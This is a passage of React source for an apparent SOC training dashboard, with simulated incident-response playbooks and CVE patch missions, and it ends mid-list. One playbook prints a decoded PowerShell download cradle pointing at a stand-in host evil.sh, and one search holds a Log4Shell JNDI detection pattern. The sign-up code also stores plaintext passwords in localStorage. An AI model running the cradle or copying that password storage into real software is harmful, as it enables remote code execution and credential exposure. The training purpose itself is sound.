import {
  useState, useEffect, useRef, useCallback,
  createContext, useContext, useMemo
} from "react";
import {
  AreaChart, Area, BarChart, Bar, XAxis, YAxis,
  CartesianGrid, Tooltip, ResponsiveContainer, Cell, PieChart, Pie
} from "recharts";

/* ═══════════════════════════════════════════════
   TOKENS
═══════════════════════════════════════════════ */
const T = {
  bg:"#04090f", surface:"#070d16", panel:"#0a1320", card:"#0d192a",
  border:"#0f1e30", line:"#162840",
  cyan:"#00b8d9", cyanG:"rgba(0,184,217,.18)",
  green:"#00c875", greenG:"rgba(0,200,117,.15)",
  red:"#f0324b",   redG:"rgba(240,50,75,.15)",
  orange:"#f5841f",orangeG:"rgba(245,132,31,.15)",
  yellow:"#f0c040",
  blue:"#3a8fff",  purple:"#9b6dff",
  tp:"#c8dff0", ts:"#3d6a8a", td:"#163050",
};
const SEV = {
  CRITICAL:{ c:T.red,    bg:"rgba(240,50,75,.10)"   },
  HIGH:    { c:T.orange, bg:"rgba(245,132,31,.10)"  },
  MEDIUM:  { c:T.yellow, bg:"rgba(240,192,64,.10)"  },
  LOW:     { c:T.blue,   bg:"rgba(58,143,255,.10)"  },
  INFO:    { c:T.ts,     bg:"transparent"           },
};
const sc = s => SEV[s]?.c || T.ts;

/* ═══════════════════════════════════════════════
   AUTH CONTEXT  (localStorage persistence)
═══════════════════════════════════════════════ */
const AuthCtx = createContext(null);
const useAuth = () => useContext(AuthCtx);

function AuthProvider({ children }) {
  const [user, setUser]   = useState(null);
  const [ready, setReady] = useState(false);

  useEffect(() => {
    try {
      const sid = localStorage.getItem("soc_sid");
      if (sid) {
        const u = JSON.parse(localStorage.getItem("soc_users") || "[]").find(u => u.id === sid);
        if (u) setUser(u);
      }
    } catch {}
    setReady(true);
  }, []);

  const getUsers = () => { try { return JSON.parse(localStorage.getItem("soc_users") || "[]"); } catch { return []; } };
  const saveUsers = us => localStorage.setItem("soc_users", JSON.stringify(us));

  const register = useCallback(data => {
    const users = getUsers();
    if (users.find(u => u.email === data.email)) return { ok:false, msg:"Email already registered." };
    const nu = {
      id: Math.random().toString(36).slice(2) + Date.now(),
      username:data.username, email:data.email, password:data.password,
      role:"SOC Analyst", department:"Security Operations", phone:"", bio:"", avatar:null,
      createdAt:new Date().toISOString(),
    };
    saveUsers([...users, nu]);
    localStorage.setItem("soc_sid", nu.id);
    setUser(nu);
    return { ok:true };
  }, []);

  const login = useCallback((email, password) => {
    const u = getUsers().find(u => u.email === email && u.password === password);
    if (!u) return { ok:false, msg:"Invalid credentials." };
    localStorage.setItem("soc_sid", u.id);
    setUser(u);
    return { ok:true };
  }, []);

  const logout = useCallback(() => {
    localStorage.removeItem("soc_sid");
    setUser(null);
  }, []);

  const updateProfile = useCallback(updates => {
    const updated = getUsers().map(u => u.id === updates.id ? { ...u, ...updates } : u);
    saveUsers(updated);
    setUser(p => ({ ...p, ...updates }));
  }, []);

  return (
    <AuthCtx.Provider value={{ user, ready, login, logout, register, updateProfile }}>
      {children}
    </AuthCtx.Provider>
  );
}

/* ═══════════════════════════════════════════════
   STATIC / SIMULATED DATA
═══════════════════════════════════════════════ */
const GEO_ATTACKS = [
  { city:"Shanghai",   country:"CN", lat:31.23,  lng:121.47, count:1842, sev:"HIGH"     },
  { city:"Moscow",     country:"RU", lat:55.75,  lng:37.62,  count:1244, sev:"CRITICAL" },
  { city:"Ashburn VA", country:"US", lat:39.04,  lng:-77.49, count: 887, sev:"MEDIUM"   },
  { city:"Tehran",     country:"IR", lat:35.69,  lng:51.39,  count: 654, sev:"HIGH"     },
  { city:"Pyongyang",  country:"KP", lat:39.02,  lng:125.75, count: 423, sev:"CRITICAL" },
  { city:"São Paulo",  country:"BR", lat:-23.55, lng:-46.63, count: 312, sev:"LOW"      },
  { city:"Lagos",      country:"NG", lat:6.52,   lng:3.37,   count: 274, sev:"MEDIUM"   },
  { city:"Frankfurt",  country:"DE", lat:50.11,  lng:8.68,   count: 201, sev:"LOW"      },
  { city:"Minsk",      country:"BY", lat:53.90,  lng:27.56,  count: 188, sev:"HIGH"     },
  { city:"Bucharest",  country:"RO", lat:44.43,  lng:26.10,  count: 145, sev:"MEDIUM"   },
];

const ALERT_CATS = [
  { name:"Malware",      value:31, fill:T.red    },
  { name:"Lateral Mvmt", value:19, fill:T.orange },
  { name:"Phishing",     value:17, fill:T.yellow },
  { name:"C2 / Exfil",  value:14, fill:T.purple },
  { name:"Recon",        value:11, fill:T.cyan   },
  { name:"Other",        value:8,  fill:T.ts     },
];

// Investigation playbooks — each alert type maps to a structured investigation
const PLAYBOOKS = {
  "Ransomware Execution": {
    icon:"💀", risk:"CRITICAL",
    summary:"Active ransomware detected on endpoint. File encryption in progress. Immediate containment required.",
    steps:[
      { id:"s1", label:"Identify affected host",          tool:"EDR Query",          cmd:"get-process -hostname 10.4.12.88 | where {$_.name -like '*ransom*'}",       result:"3 suspicious processes found: wncry.exe, tasksche.exe, mssecsvc.exe" },
      { id:"s2", label:"Capture memory snapshot",         tool:"EDR Forensics",      cmd:"Invoke-MemoryDump -Host 10.4.12.88 -Output /forensics/dump_$(date).bin",    result:"Memory dump saved: 4.2GB → /forensics/dump_20250309.bin" },
      { id:"s3", label:"Isolate endpoint from network",   tool:"NAC / EDR",          cmd:"Set-NetworkIsolation -Host 10.4.12.88 -Mode FULL",                         result:"Host 10.4.12.88 quarantined — all network access blocked" },
      { id:"s4", label:"Kill ransomware processes",       tool:"EDR Kill",           cmd:"Stop-Process -Host 10.4.12.88 -Name wncry.exe,tasksche.exe -Force",         result:"Processes terminated. Encryption halted at 23% of targeted files." },
      { id:"s5", label:"Block C2 at perimeter firewall",  tool:"Firewall API",       cmd:"fw rule add block dst=185.220.101.7/32 proto=any dir=outbound",             result:"Rule #4421 added — C2 IP 185.220.101.7 blocked at perimeter" },
      { id:"s6", label:"Restore from clean backup",       tool:"Backup Manager",     cmd:"Restore-Backup -Host 10.4.12.88 -Snapshot 2025-03-08T02:00 -Verify",       result:"Backup integrity verified. Restore complete. 0 encrypted files remain." },
      { id:"s7", label:"Confirm neutralization",          tool:"Threat Validation",  cmd:"Test-ThreatNeutralized -Host 10.4.12.88 -CVE CVE-2017-0144",               result:"✓ THREAT NEUTRALIZED — All IOCs cleared. Host safe to reconnect." },
    ],
    neutralizeMsg:"Ransomware successfully contained. 23% file encryption halted. Host restored from backup. C2 blocked at perimeter.",
  },
  "C2 Beacon Detected": {
    icon:"📡", risk:"CRITICAL",
    summary:"Compromised host beaconing to known C2 infrastructure. Likely post-exploitation stage. Attacker has foothold.",
    steps:[
      { id:"s1", label:"Trace beacon pattern & interval",  tool:"NDR / PCAP",        cmd:"tcpdump -i eth0 'host 185.220.101.7' -w /pcap/beacon.pcap",                result:"Beacon interval: 300s. HTTP POST to /gate.php. Encoded payload detected." },
      { id:"s2", label:"Identify implant on host",         tool:"EDR Hunt",          cmd:"Get-ChildItem C:\\Windows\\Temp -Recurse | Get-FileHash | cmp-hash TIP",   result:"Cobalt Strike beacon found: C:\\Windows\\Temp\\svchost32.exe (SHA256 match)" },
      { id:"s3", label:"Extract IOCs from memory",         tool:"YARA Scanner",      cmd:"yara64.exe cobalt_strike_rules.yar 10.4.12.88 -r",                         result:"Rule COBALTSTRIKE_BEACON_v4 matched at offset 0x1A40" },
      { id:"s4", label:"Block C2 domains & IPs",           tool:"Firewall + DNS",    cmd:"fw block 185.220.101.7; dns-sinkhole add evil-redir.io",                   result:"2 IOCs blocked. DNS sinkhole active for evil-redir.io" },
      { id:"s5", label:"Remove implant & persistence",     tool:"EDR Remediation",   cmd:"Remove-MaliciousFile -Path 'C:\\Windows\\Temp\\svchost32.exe' -CleanReg",  result:"Implant deleted. Registry run key removed. No additional persistence found." },
      { id:"s6", label:"Reset compromised credentials",    tool:"AD Admin",          cmd:"Reset-ADAccountPassword -Identity CORP\\jdoe -RandomSecure",              result:"Password reset for 2 accounts. MFA re-enrollment forced." },
      { id:"s7", label:"Verify beacon silence",            tool:"NDR Monitor",       cmd:"Watch-NetworkBaseline -Host 10.0.3.201 -Duration 600",                    result:"✓ THREAT NEUTRALIZED — No C2 traffic detected for 10 minutes. Host clean." },
    ],
    neutralizeMsg:"C2 beacon eliminated. Cobalt Strike implant removed, persistence cleaned, credentials rotated.",
  },
  "Pass-the-Hash Attempt": {
    icon:"🔑", risk:"HIGH",
    summary:"Attacker attempting lateral movement using stolen NTLM hash. Active directory accounts at risk.",
    steps:[
      { id:"s1", label:"Identify source of hash theft",    tool:"SIEM Correlation",  cmd:"search index=winevent EventCode=4776 src=10.1.2.45 last=1h",              result:"Credential access from WS-DEV-014 at 13:44 UTC. Mimikatz artifacts found." },
      { id:"s2", label:"Determine which accounts targeted", tool:"AD Audit",         cmd:"Get-ADUser -Filter * | where {$_.LastLogonDate -gt (Get-Date).AddHours(-1)}", result:"3 privileged accounts targeted: svc_backup, j.admin, domain.admin" },
      { id:"s3", label:"Disable targeted accounts",        tool:"AD Console",        cmd:"Disable-ADAccount -Identity svc_backup,j.admin,domain.admin",             result:"3 accounts disabled. Active sessions terminated." },
      { id:"s4", label:"Force Kerberos ticket expiry",     tool:"Domain Controller", cmd:"Invoke-KerberosTicketPurge -Scope Domain",                                result:"All Kerberos tickets purged. Re-authentication required domain-wide." },
      { id:"s5", label:"Isolate source workstation",       tool:"NAC",               cmd:"Set-NetworkIsolation -Host 10.1.2.45 -Mode FULL",                         result:"WS-DEV-014 isolated. User notified." },
      { id:"s6", label:"Rotate all service account creds", tool:"PAM Vault",         cmd:"Invoke-CredentialRotation -Type ServiceAccounts -Verify",                 result:"14 service account passwords rotated. PAM vault updated." },
      { id:"s7", label:"Confirm lateral movement blocked", tool:"SIEM Alert",        cmd:"Test-LateralMovement -Baseline -Window 30m",                              result:"✓ THREAT NEUTRALIZED — No further PTH attempts detected." },
    ],
    neutralizeMsg:"Pass-the-Hash attack blocked. Affected accounts disabled, Kerberos tickets purged, source isolated.",
  },
  "SSH Brute Force": {
    icon:"🔨", risk:"HIGH",
    summary:"External IP executing SSH brute force against internet-facing server. 847 attempts in 12 minutes.",
    steps:[
      { id:"s1", label:"Confirm brute force pattern",      tool:"SIEM Query",        cmd:"search src_ip=92.118.39.22 dst_port=22 | stats count by minute",           result:"847 attempts over 12min. Distributed across 12 usernames. Rate: 70/min." },
      { id:"s2", label:"Check if any login succeeded",     tool:"Auth Log Analysis", cmd:"grep 'Accepted password' /var/log/auth.log | grep 92.118.39.22",           result:"No successful logins. All attempts blocked by fail2ban (max 5 attempts)." },
      { id:"s3", label:"Block attacker IP at perimeter",   tool:"Firewall",          cmd:"iptables -I INPUT -s 92.118.39.22 -j DROP; fw-sync replicate",             result:"IP 92.118.39.22 blocked. Rule replicated to 3 edge firewalls." },
      { id:"s4", label:"Add IP to threat intel blacklist", tool:"TIP",               cmd:"tip-cli add-ioc --type ip --value 92.118.39.22 --sev HIGH --ttl 30d",      result:"IOC added to TIP. 47 other clients sharing feed auto-blocked." },
      { id:"s5", label:"Harden SSH configuration",         tool:"Config Mgmt",       cmd:"ansible-playbook ssh-hardening.yml -l 10.0.0.22 --tags restrict-auth",    result:"SSH: PermitRootLogin=no, MaxAuthTries=3, AllowUsers=svc_accounts only." },
      { id:"s6", label:"Verify attack surface reduced",    tool:"Nmap / Shodan",     cmd:"nmap -sV -p 22 10.0.0.22 --script=ssh-auth-methods",                      result:"SSH now requires public-key auth only. Password auth disabled." },
    ],
    neutralizeMsg:"SSH brute force neutralized. Attacker IP blocked globally, SSH hardened to key-only auth.",
  },
  "Lateral Movement – RDP": {
    icon:"🖥️", risk:"HIGH",
    summary:"Compromised host using RDP to move laterally to domain controller. Potential domain compromise imminent.",
    steps:[
      { id:"s1", label:"Map lateral movement path",        tool:"NDR Graph",         cmd:"graph-lateral -src 10.1.5.33 -protocol RDP -timerange 1h",                result:"Path: WS-SALES-07 → SRV-FILE-02 → SRV-DC-02 (Domain Controller!)" },
      { id:"s2", label:"Terminate active RDP sessions",    tool:"EDR",               cmd:"Get-RDPSessions | Where-Object {$_.SourceIP -eq '10.1.5.33'} | Disconnect", result:"2 active RDP sessions terminated on SRV-DC-02." },
      { id:"s3", label:"Block RDP between workstations",   tool:"Firewall Policy",   cmd:"acl add deny tcp any workstations dst-port 3389 dir=internal",            result:"Micro-segmentation rule deployed. Workstation→Workstation RDP blocked." },
      { id:"s4", label:"Check DC for compromise signs",    tool:"EDR + Event Logs",  cmd:"Get-WinEvent -Computer SRV-DC-02 -Id 4624,4672,4698 -Last 2h",           result:"No DCSync or GPO modification detected. DC appears intact." },
      { id:"s5", label:"Reset source host credentials",    tool:"AD + EDR",          cmd:"Isolate-Host 10.1.5.33; Reset-LocalAdminPassword -RandomSecure",          result:"WS-SALES-07 isolated. LAPS password rotated." },
      { id:"s6", label:"Verify no persistence on DC",      tool:"Threat Hunting",    cmd:"Invoke-AtomicTest T1547 -GetPrereqs; hunt-scheduled-tasks SRV-DC-02",     result:"✓ THREAT NEUTRALIZED — No persistence. Movement chain severed." },
    ],
    neutralizeMsg:"Lateral movement via RDP contained. DC uncompromised. Micro-segmentation rules deployed.",
  },
  "Suspicious PS Execution": {
    icon:"⚡", risk:"MEDIUM",
    summary:"Encoded PowerShell command executed with bypass flags. Possible fileless malware or download cradle.",
    steps:[
      { id:"s1", label:"Decode the PowerShell payload",    tool:"CyberChef / PS",    cmd:"[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc))", result:"Decoded: IEX(New-Object Net.WebClient).DownloadString('http://evil.sh/ps')" },
      { id:"s2", label:"Check network call destination",   tool:"DNS + Proxy Logs",  cmd:"dns-query evil.sh; proxy-log search dst=evil.sh last=1h",                  result:"Domain evil.sh → 91.92.251.10 (RU). 3 DNS queries from 10.2.8.14." },
      { id:"s3", label:"Determine if payload executed",    tool:"EDR Process Tree",  cmd:"Get-ProcessTree -Host 10.2.8.14 -Parent powershell.exe -Depth 3",          result:"No child processes spawned. Script failed at execution stage." },
      { id:"s4", label:"Block download destination",       tool:"Proxy + Firewall",  cmd:"proxy-block evil.sh 91.92.251.10; fw rule add block dst=91.92.251.10",      result:"Domain and IP blocked. User notified via popup." },
      { id:"s5", label:"Enable PS Constrained Language",   tool:"GPO / Registry",    cmd:"Set-GPO -Policy 'PS-Constrained-Language' -Target 10.2.8.14",             result:"PowerShell constrained language mode enforced on host." },
      { id:"s6", label:"Verify host is clean",             tool:"AV + EDR Full Scan",cmd:"Invoke-EDRScan -Host 10.2.8.14 -Type FULL -Yara all_rules.yar",           result:"✓ THREAT NEUTRALIZED — No malware found. Host confirmed clean." },
    ],
    neutralizeMsg:"PowerShell attack blocked before payload executed. Host clean, download domains blocked.",
  },
  "DNS Tunneling Suspected": {
    icon:"🕳️", risk:"MEDIUM",
    summary:"Anomalous DNS query patterns detected suggesting data exfiltration via DNS tunneling.",
    steps:[
      { id:"s1", label:"Capture suspicious DNS queries",   tool:"DNS Analytics",     cmd:"dns-analytics -src 10.2.9.77 -anomaly HIGH -export /tmp/dns_capture.csv", result:"847 queries to *.evil-redir.io. Avg subdomain length: 52 chars (normal: 8)." },
      { id:"s2", label:"Decode DNS payload",               tool:"DNSExfil Decoder",  cmd:"dnsexfil-decode /tmp/dns_capture.csv --algo base32 --output payload.txt", result:"Decoded 2.3MB of data. Content: /etc/passwd, SSH keys, internal docs." },
      { id:"s3", label:"Block DNS tunneling domain",       tool:"DNS Firewall",      cmd:"dns-fw block evil-redir.io --recursive --log-attempts",                   result:"Domain blocked at DNS layer. Sinkholed to internal 127.0.0.1." },
      { id:"s4", label:"Identify exfiltrated data scope",  tool:"DLP + SIEM",        cmd:"dlp-scan --correlate-dns 10.2.9.77 --timerange 24h",                      result:"Exfiltrated: 2.3MB — SSH keys, 1 passwd file, 3 internal docs." },
      { id:"s5", label:"Rotate compromised credentials",   tool:"Secrets Manager",   cmd:"Invoke-SecretRotation -Scope Host -Target 10.2.9.77 -Type SSH,Service",   result:"SSH keys rotated. 6 service credentials invalidated and reissued." },
      { id:"s6", label:"Deploy DNS anomaly detection",     tool:"DNS Security",      cmd:"dns-sec enable-ml-anomaly --threshold 95pct --alert CRITICAL",            result:"✓ THREAT NEUTRALIZED — Exfil channel closed. ML baseline relearning." },
    ],
    neutralizeMsg:"DNS tunneling exfiltration channel closed. Compromised credentials rotated. ML baseline updated.",
  },
  "Failed MFA × 12": {
    icon:"🔒", risk:"MEDIUM",
    summary:"12 failed MFA attempts on single user account. Possible account takeover attempt with valid password.",
    steps:[
      { id:"s1", label:"Identify source of MFA attempts",  tool:"Azure AD / CASB",   cmd:"Get-AuditLog -User 10.3.1.5 -EventType MFA_FAILURE -Last 1h",            result:"12 MFA push attempts from 10.3.1.5 + 3 from 195.154.x.x (FR proxy)." },
      { id:"s2", label:"Check if password was breached",   tool:"HaveIBeenPwned API",cmd:"hibp-check --email user@corp.com --api-key $KEY",                          result:"Email found in 2 breaches: RockYou2024, Collection#1. Password likely known." },
      { id:"s3", label:"Lock account temporarily",         tool:"AD / Azure AD",     cmd:"Set-AzureADUser -ObjectId user@corp.com -AccountEnabled $false",           result:"Account locked. User notified via secondary email." },
      { id:"s4", label:"Force password reset",             tool:"AD Admin",          cmd:"Set-ADAccountPassword -Identity user@corp.com -Reset -NewPassword (secure)", result:"Password reset to random 32-char value. User must set new on unlock." },
      { id:"s5", label:"Enable number matching MFA",       tool:"Azure AD MFA",      cmd:"Set-MFAPolicy -User user@corp.com -RequireNumberMatch $true",             result:"Number matching + location context MFA enforced." },
      { id:"s6", label:"Unblock after verification",       tool:"IT Service Desk",   cmd:"Unlock-ADAccount -Identity user@corp.com -AfterVerification",             result:"✓ THREAT NEUTRALIZED — Account secured. User verified via manager." },
    ],
    neutralizeMsg:"Account takeover attempt blocked. Password changed, number-matching MFA enforced.",
  },
};

// Missions data
const MISSIONS_DATA = [
  {
    id:"m1", title:"Log4Shell Emergency Patch",
    cve:"CVE-2021-44228", sev:"CRITICAL", xp:500, time:"45 min",
    category:"Patch Deployment",
    desc:"Apache Log4j JNDI injection allows unauthenticated RCE. CVSS 10.0. You have 3 vulnerable servers that need immediate virtual patching and WAF rule deployment before exploitation.",
    objectives:["Identify all Log4j versions in environment","Deploy WAF rules to block JNDI injection strings","Apply vendor patch log4j-2.17.1 to all services","Verify no exploitation occurred","Generate incident report"],
    steps:[
      { id:"p1", label:"Scan environment for Log4j", tool:"Vulnerability Scanner", desc:"Run a targeted scan to find all Java services using Log4j 2.x", cmd:"nessus-cli scan --plugin 155998 --target 10.0.0.0/16 --output log4j_scan.csv", result:"Found: SRV-APP-01 (2.14.1), SRV-APP-02 (2.15.0), SRV-API-01 (2.13.0) — ALL VULNERABLE", completed:false },
      { id:"p2", label:"Deploy WAF JNDI block rules", tool:"WAF / ModSecurity", desc:"Block all JNDI lookup strings at the application layer before patching", cmd:"waf-rule deploy log4shell_block_v3.conf --mode BLOCK --log VERBOSE", result:"Rule deployed to 3 WAF nodes. 0 bypass detected in test suite.", completed:false },
      { id:"p3", label:"Apply patch to SRV-APP-01",  tool:"Ansible / Package Mgr", desc:"Replace vulnerable log4j-core JAR with patched 2.17.1 version", cmd:"ansible-playbook patch_log4j.yml -l SRV-APP-01 --extra-vars 'version=2.17.1'", result:"log4j-core-2.17.1.jar deployed. Service restarted. Health check PASSED.", completed:false },
      { id:"p4", label:"Apply patch to SRV-APP-02",  tool:"Ansible", desc:"Patch second vulnerable server", cmd:"ansible-playbook patch_log4j.yml -l SRV-APP-02 --extra-vars 'version=2.17.1'", result:"log4j-core-2.17.1.jar deployed. Service restarted. Health check PASSED.", completed:false },
      { id:"p5", label:"Apply patch to SRV-API-01",  tool:"Ansible", desc:"Patch third vulnerable server (oldest version — highest risk)", cmd:"ansible-playbook patch_log4j.yml -l SRV-API-01 --extra-vars 'version=2.17.1'", result:"log4j-core-2.17.1.jar deployed. Service restarted. Health check PASSED.", completed:false },
      { id:"p6", label:"Verify no exploitation in logs", tool:"SIEM / Log Analysis", desc:"Search historical logs for JNDI exploitation patterns before patch window", cmd: `siem search '\${jndi:' OR '\${::-j}\${::-n}\${::-d}\${::-i}' timerange=7d`, result:"0 exploitation attempts found in 7-day lookback. Patch applied before exploitation.", completed:false },
      { id:"p7", label:"Close vulnerability & report", tool:"Vuln Mgmt / Ticketing", desc:"Mark CVE as remediated and generate CISO-level report", cmd:"vuln-mgmt close CVE-2021-44228 --evidence patch_log4j_report.pdf --notify CISO", result:"✓ MISSION COMPLETE — CVE-2021-44228 remediated on all 3 systems. Report sent.", completed:false },
    ],
  },
  {
    id:"m2", title:"Ivanti Zero-Day Remediation",
    cve:"CVE-2025-0282", sev:"CRITICAL", xp:600, time:"60 min",
    category:"Zero-Day Response",
    desc:"Pre-authentication stack overflow in Ivanti Connect Secure. CISA KEV listed. Threat group UNC5337 actively exploiting. Your VPN gateway is exposed. Patch or mitigate immediately.",
    objectives:["Assess Ivanti version and exposure","Apply Ivanti ICT mitigation tool","Deploy emergency patch 22.7R2.4","Verify no compromise occurred","Enable enhanced monitoring"],
    steps:[
      { id:"p1", label:"Identify Ivanti version",          tool:"Asset Management",  desc:"Check exact version of Ivanti Connect Secure in environment", cmd:"ssh admin@vpn.corp.com 'cat /etc/issue; show version'", result:"Ivanti Connect Secure 22.7R2.1 — VULNERABLE (patched version: 22.7R2.4)", completed:false },
      { id:"p2", label:"Run Ivanti ICT integrity check",   tool:"Ivanti ICT",        desc:"Check if appliance was already compromised before patching", cmd:"./ict_tool.sh --mode integrity-check --output ict_report.xml", result:"ICT Result: No indicators of compromise found. Clean baseline confirmed.", completed:false },
      { id:"p3", label:"Enable workaround mitigations",    tool:"Ivanti Admin UI",   desc:"Apply published workarounds to reduce attack surface during patch window", cmd:"ivanti-cli mitigation apply CVE-2025-0282 --config restricted_mode.xml", result:"Restricted access mode enabled. API endpoints limited to authenticated.", completed:false },
      { id:"p4", label:"Block known exploit IPs at FW",    tool:"Perimeter Firewall", desc:"Block UNC5337 infrastructure IPs published by CISA", cmd:"fw-batch-block --ioc-feed cisa_unc5337_iocs.txt --action DROP --log",         result:"847 UNC5337 IPs blocked. 12 attempted connections blocked post-rule.", completed:false },
      { id:"p5", label:"Apply patch 22.7R2.4",             tool:"Ivanti Update Mgr", desc:"Deploy the official emergency patch to VPN gateway", cmd:"ivanti-update apply 22.7R2.4 --maintenance-window now --reboot-if-required", result:"Patch applied. Appliance rebooted. Running 22.7R2.4 — PATCHED.", completed:false },
      { id:"p6", label:"Post-patch ICT verification",      tool:"Ivanti ICT",        desc:"Re-run integrity check on patched system to confirm clean state", cmd:"./ict_tool.sh --mode post-patch-verify --baseline pre_patch_ict.xml",     result:"Post-patch integrity: CLEAN. No web shells, no persistence, no backdoors.", completed:false },
      { id:"p7", label:"Enable enhanced logging & alert",  tool:"SIEM + Ivanti",     desc:"Deploy detection rules for continued exploitation attempts", cmd:"siem rule deploy ivanti_cve_2025_0282_detect.xml --severity CRITICAL",   result:"✓ MISSION COMPLETE — Ivanti patched. Detection rules active. CISO notified.", completed:false },
    ],
  },
  {
    id:"m3", title:"Windows PrintNightmare Containment",
    cve:"CVE-2021-34527", sev:"HIGH", xp:350, time:"30 min",
    category:"Patch Deployment",
    desc:"Windows Print Spooler RCE allows privilege escalation to SYSTEM. Affects all Windows versions. Disable spooler on servers while patch is deployed.",
    objectives:["Identify exposed systems","Disable Print Spooler on servers","Apply KB5005010 patch","Verify remediation"],
    steps:[
      { id:"p1", label:"Find systems with Spooler running", tool:"Powershell / SCCM", desc:"Enumerate all systems with Print Spooler service enabled", cmd:"Get-ADComputer -Filter * | Invoke-Command {Get-Service Spooler} | where Status -eq Running", result:"47 workstations + 8 servers running Print Spooler. Servers are critical risk.", completed:false },
      { id:"p2", label:"Disable Spooler on all servers",    tool:"GPO / PowerShell",  desc:"Immediately stop and disable Print Spooler on all domain servers", cmd:"Invoke-Command -ComputerName (Get-ADComputer -Filter {OperatingSystem -like '*Server*'}) {Stop-Service Spooler; Set-Service Spooler -StartupType Disabled}", result:"Print Spooler disabled on 8 servers. No printing services impacted (servers don't print).", completed:false },
      { id:"p3", label:"Restrict Spooler on workstations",  tool:"GPO",               desc:"Apply GPO to restrict spooler to localhost only on workstations", cmd:"Set-GPO PrintSpoolerPolicy -Setting RestrictDriverInstallToAdministrators -Value 1", result:"GPO deployed. Driver installation restricted to admins only on all workstations.", completed:false },
      { id:"p4", label:"Deploy KB5005010 via WSUS",         tool:"WSUS / SCCM",       desc:"Push Microsoft emergency patch to all vulnerable systems", cmd:"sccm-deploy patch KB5005010 --collection All_Windows --deadline now --required",result:"Patch KB5005010 deployed to 55 systems. 51/55 rebooted and confirmed patched.", completed:false },
      { id:"p5", label:"Verify 4 remaining systems",        tool:"Remote Support",    desc:"Manually patch the 4 systems that didn't auto-update", cmd:"wuauclt /detectnow /updatenow on WS-OFFLINE-04,WS-OFFLINE-07,WS-OFFLINE-11,WS-OFFLINE-22", result:"4 systems patched manually via remote session. All 55 systems now patched.", completed:false },
      { id:"p6", label:"Validate with Tenable scan",        tool:"Tenable.io",        desc:"Confirm zero remaining CVE-2021-34527 exposure in environment", cmd:"tenable scan --policy PrintNightmare --target 10.0.0.0/16 --verify",          result:"✓ MISSION COMPLETE — 0 remaining vulnerable systems. Tenable confirms remediated.", completed:false },
    ],
  },
  {
    id:"m4", title:"Ransomware Tabletop Drill",
    cve:null, sev:"HIGH", xp:400, time:"50 min",
    category:"Incident Response",
    desc:"Simulate a full ransomware incident from initial compromise to recovery. Follow the NIST IR framework. Your decisions affect simulated business impact score.",
    objectives:["Execute NIST IR phases: Prepare, Detect, Contain, Eradicate, Recover","Document all actions in IR log","Achieve <30min MTTC (Mean Time to Contain)","Complete post-incident report"],
    steps:[
      { id:"p1", label:"Phase 1: Detection — Alert Triage",  tool:"SIEM",             desc:"Ransomware alert fired. Triage to confirm true positive vs false alarm.", cmd:"siem search EventCode=4663 TargetFileExtension=.wncry last=5min | count by host", result:"47 .wncry files created on WS-FIN-003 in 4 minutes. TRUE POSITIVE confirmed.", completed:false },
      { id:"p2", label:"Phase 2: Notify IR Team",            tool:"PagerDuty / Slack", desc:"Activate Incident Response plan. Page on-call team. Open war room.", cmd:"ir-activate --severity P1 --type ransomware --page IR_TEAM,CISO,LEGAL --room #ir-war-room", result:"IR team notified. CISO, Legal, PR on standby. War room #ir-war-room active.", completed:false },
      { id:"p3", label:"Phase 3: Containment — Isolate",     tool:"NAC / EDR",         desc:"Isolate affected host to stop encryption spread across network.", cmd:"edr isolate WS-FIN-003 --mode FULL --reason 'Ransomware P1'",                  result:"WS-FIN-003 isolated in 4:23 from alert. Network access blocked.", completed:false },
      { id:"p4", label:"Phase 3: Block network propagation", tool:"Firewall / Switches", desc:"Block SMB/RDP laterally to prevent worm spread while investigating.", cmd:"sw-acl add deny tcp any any dst-port 445,3389 vlan WORKSTATIONS",            result:"SMB and RDP blocked across WORKSTATIONS VLAN. No additional hosts encrypted.", completed:false },
      { id:"p5", label:"Phase 4: Eradication — Remove threat", tool:"EDR + IR Kit",    desc:"Remove ransomware binaries and clean registry persistence.", cmd:"ir-eradicate --host WS-FIN-003 --type ransomware --collect-evidence",         result:"Ransomware removed. 3 persistence keys cleaned. Evidence package collected.", completed:false },
      { id:"p6", label:"Phase 5: Recovery — Restore backup",  tool:"Backup Manager",   desc:"Restore affected files from last clean backup. Verify integrity.", cmd:"backup restore WS-FIN-003 --snapshot clean_20250308 --verify-hash",          result:"1,247 files restored from clean snapshot. Hash verification: ALL PASSED.", completed:false },
      { id:"p7", label:"Phase 6: Post-Incident Report",       tool:"IR Platform",       desc:"Document timeline, IOCs, gaps, and lessons learned for CISO.", cmd:"ir-report generate --incident INC-20250309-001 --format NIST --send CISO",   result:"✓ MISSION COMPLETE — Full IR cycle complete. MTTC: 18min. Report delivered.", completed:false },
    ],
  },
  {
    id:"m5", title:"FortiGate Auth Bypass Patch",
    cve:"CVE-2024-55591", sev:"CRITICAL", xp:550, time:"40 min",
    category:"Zero-Day Response",
    desc:"FortiOS authentication bypass via crafted Node.js WebSocket requests allows unauthenticated admin access. 2 FortiGate firewalls exposed at network perimeter.",
    objectives:["Assess FortiOS versions","Check for active exploitation","Apply emergency patches","Harden WebSocket endpoints","Verify remediation"],
    steps:[
      { id:"p1", label:"Check FortiGate versions",           tool:"FortiManager",      desc:"Identify exact FortiOS versions running on perimeter firewalls", cmd:"fortimanager get device-list | grep -E 'hostname|firmware'",                result:"FGT-EDGE-01: FortiOS 7.0.13 (VULNERABLE) | FGT-EDGE-02: FortiOS 7.0.13 (VULNERABLE)", completed:false },
      { id:"p2", label:"Check for compromise indicators",    tool:"FortiGate Logs",    desc:"Search logs for unauthorized admin logins via WebSocket path", cmd:"execute log filter field dstport 8443; execute log display",                result:"2 suspicious WebSocket connections from 185.234.x.x. No config changes made.", completed:false },
      { id:"p3", label:"Restrict WebSocket access",          tool:"FortiGate CLI",     desc:"Apply access policy to limit management plane to known IPs only", cmd:"config system interface; edit mgmt; set allowaccess https; set admin-restrict-local enable", result:"Management access restricted to 10.0.1.0/24 admin VLAN only.", completed:false },
      { id:"p4", label:"Apply FortiOS patch to FGT-EDGE-01", tool:"FortiManager",      desc:"Deploy emergency patch 7.0.15 to first firewall", cmd:"fortimanager upgrade device FGT-EDGE-01 --firmware fortios-7.0.15.out --schedule now", result:"FGT-EDGE-01 upgraded to 7.0.15. Config validated. Failover to FGT-EDGE-02 during upgrade.", completed:false },
